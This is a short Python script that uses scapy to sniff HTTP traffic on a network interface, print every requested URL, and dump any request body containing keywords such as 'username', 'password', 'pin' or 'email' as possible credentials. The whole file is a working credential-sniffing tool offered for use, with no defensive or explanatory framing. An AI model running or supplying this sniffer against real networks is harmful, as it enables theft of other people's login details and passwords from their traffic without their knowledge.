#!/usr/bin/venv python3

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #you can add filter="port 21" to filter ports other than http/s

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "login", "pass", "pw", "password", "tel", "email", "key", "pin",
                    "code"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] URL: " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\nPossible username/password: " + login_info + "\n\n")


sniff("eth0")